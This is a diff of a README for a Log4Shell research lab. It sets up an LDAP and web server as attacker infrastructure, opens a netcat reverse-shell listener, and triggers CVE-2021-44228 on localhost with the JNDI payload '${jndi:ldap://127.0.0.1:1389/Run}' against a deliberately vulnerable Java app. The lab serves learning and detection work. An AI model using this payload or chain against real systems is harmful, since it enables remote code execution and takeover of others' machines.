@@ -1,18 +1,22 @@
-# Log4j RCE Research Lab 🚧
+# Log4Shell Research Lab 🚧
 
 A basic research lab to learn more about `Log4Shell`:
 * [CVE-2021-45105](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-45105)
 * [CVE-2021-45046](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-45046)
 * [CVE-2021-44228](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-44228)
 
-## Research notes
-
-I took the [following notes](research-notes/README.md) while learning about `Log4Shell`. I hopre they are helpful! 🍻
 ## Used By
 
-* [Microsoft Sentinel To-Go! CVE-2021-44228-Log4Shell Demo](https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell)
+* [Microsoft Sentinel To-Go! Log4Shell Demo](https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell)
 
-## Deploy LDAP Reference & Web Servers
+## Research notes
+
+* I took the [following notes](research-notes/README.md) while learning about `Log4Shell`. I hope they are helpful! 🍻.
+* Depending on which CVE you want to test, use the following research notes to simulate a few scenarios:
+    * [CVE-2021-44228 Simulation](research-notes/2021-12-11_01-CVE-2021-44228-simulation.md)
+    * [CVE-2021-45046 Simulation](research-notes/2022-01-03_01-CVE-2021-45046-simulation.md)
+
+## A Basic POC - CVE-2021-44228
 
 ### Clone Repo
 
@@ -20,10 +24,20 @@ I took the [following notes](research-notes/README.md) while learning about `Log
 sudo su
 git clone https://github.com/Cyb3rWard0g/log4jshell-lab
 ```
+
+### Install Docker
+
+```bash
+wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Docker.sh
+chmod +x Install-Docker.sh
+
+./Install-Docker.sh
+```
+
 ### Run Docker Compose File
 
 ```
-cd log4jshell-lab
+cd log4jshell-lab/attacker
 docker-compose -f MarshalsecLDAP-NginxWebServer.yml up --build -d
 ```
 
@@ -35,9 +49,10 @@ docker ps
 docker logs --follow ldap-server
 docker logs --follow web-server
 ```
-## Run Basic Test
 
-This scenario simulates an attacker using the log4j RCE vulnerability to get a shell locally (127.0.0.1) via netcat.
+## Trigger CVE-2021-44228
+
+This scenario simulates an attacker using the log4j [CVE-2021-44228](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-44228) RCE vulnerability to get a shell locally (127.0.0.1) via netcat.
 We are going to execute everything on the same endpoint where we deployed our attacker's infrastructure.
 
 ### Start Netcat Server
@@ -45,24 +60,25 @@ We are going to execute everything on the same endpoint where we deployed our at
 ```
 nc -lvnp 443
 ```
-### Compile Basic JAR
+
+### Compile Vulnerable Java Application
 
 **Docker**
 ```
-cd vulnApps/basicJar
+cd log4jshell-lab/victim/vuln-apps/others/basicJar
+
 docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
 ```
 
-**Manual**
+**Manually**
 ```
-cd vulnApps/basicJar
+cd log4jshell-lab/victim/vuln-apps/others/basicJar
 mvn -f pom.xml clean package -DskipTests
 ```
 
 ### Run Application
 
 ```
-cd vulnApps/basicJar
 java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'
 ```
 
